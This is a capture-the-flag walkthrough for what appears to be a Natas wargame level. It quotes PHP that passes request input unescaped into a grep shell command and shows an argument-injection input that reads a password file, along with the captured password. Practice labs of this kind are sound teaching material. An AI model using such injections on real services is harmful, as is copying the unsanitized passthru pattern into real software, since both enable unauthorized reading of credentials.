This level is nearly identical to the last one, with one major difference, which didn't change the challenge all that much. The source code for this challenge is below

```
`<?   
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
	$key = $_REQUEST["needle"];   }      
	
if($key != "") {       
	if(preg_match('/[;|&]/',$key)) {
		print "Input contains an illegal character!";   
	} 
	else {
		passthru("grep -i $key dictionary.txt");       
	}   
}   
?>`
```

the main difference being the preg_match command outlawing ; & and |
these are the characters used to stop a linux command, and start a new one right after on the same line. These are also how we solved the last challenge. Luckily they already gave us a grep command that we can use. 

you don't have to end the grep command to get your password. I used the following command to grep for e in the password directory, using the hunch that somewhere in the unique password there would be an e.

```
e ../../../../etc/natas_webpass/natas11
```

this means the command passed to the server is 

```
grep -i e ../../../../etc/natas_webpass/natas11 dictionary.txt
```

the output is much longer, because it's also grepping for e in dictionary.txt
however the first line was the grepped password

../../../../etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg